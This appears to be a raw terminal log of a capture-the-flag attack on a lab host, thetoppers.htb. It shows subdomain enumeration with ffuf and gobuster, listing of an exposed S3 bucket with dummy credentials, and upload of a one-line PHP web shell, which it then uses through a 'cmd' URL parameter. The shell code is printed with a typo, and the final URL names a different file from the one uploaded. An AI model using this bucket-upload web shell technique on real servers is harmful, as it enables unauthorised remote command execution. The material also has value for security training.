└─# ffuf -w 2words.txt -H "Host: FUZZ.thetoppers.htb" -u http://thetoppers.htb -fs 11952 


crunch 2 2 > wwords.txt
└─# gobuster vhost --append-domain -u http://thetoppers.htb -w wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://thetoppers.htb
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
[+] User Agent:      gobuster/3.2.0-dev
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2023/01/28 02:18:52 Starting gobuster in VHOST enumeration mode
===============================================================
Found: s3.thetoppers.htb Status: 404 [Size: 21]
Found: gc._msdcs.thetoppers.htb Status: 400 [Size: 306]
Found: _domainkey.thetoppers.htb Status: 400 [Size: 306]
Progress: 19966 / 19967 (99.99%)===============================================================
2023/01/28 02:29:05 Finished
└─# aws s3 ls s3.thetoppers.htb
Unable to locate credentials. You can configure credentials by running "aws configure".
                                                                                                                    
┌──(root㉿kali)-[~]
└─# aws s3 ls s3://thetoppers.htb 
Unable to locate credentials. You can configure credentials by running "aws configure".
                                                                                                                    
┌──(root㉿kali)-[~]
└─# aws configure                
AWS Access Key ID [None]: a
AWS Secret Access Key [None]: a
Default region name [None]: a
Default output format [None]: a
                                                                                                                    
┌──(root㉿kali)-[~]
└─# aws s3 ls s3://thetoppers.htb


Could not connect to the endpoint URL: "https://s3.a.amazonaws.com/thetoppers.htb?list-type=2&prefix=&delimiter=%2F&encoding-type=url"
                                                                                                                    
┌──(root㉿kali)-[~]
└─# 
                                                                                                                    
┌──(root㉿kali)-[~]
└─# aws s3  --endpoint=http://s3.thetoppers.htb ls  s3://thetoppers.htb 
                           PRE images/
2023-01-28 01:05:23          0 .htaccess
2023-01-28 01:05:23      11952 index.php
                                                                                                                    
┌──(root㉿kali)-[~]
└─# 





┌──(root㉿kali)-[/usr/share/webshells]
└─# aws s3  --endpoint=http://s3.thetoppers.htb cp shell.php  s3://thetoppers.htb 
upload: ./shell.php to s3://thetoppers.htb/shell.php             
                                                                                                                    
┌──(root㉿kali)-[/usr/share/webshells]
└─# aws s3  --endpoint=http://s3.thetoppers.htb ls  s3://thetoppers.htb
                           PRE images/
2023-01-28 01:05:23          0 .htaccess
2023-01-28 01:05:23      11952 index.php
2023-01-28 04:11:06         31 shell.php
                                                                                                                    
┌──(root㉿kali)-[/usr/share/webshells]
└─# 


shell.php
<?php system($ GET['cmd']); ?>


--> * http://thetoppers.htb/shell1.php?cmd=ls
will provide the info

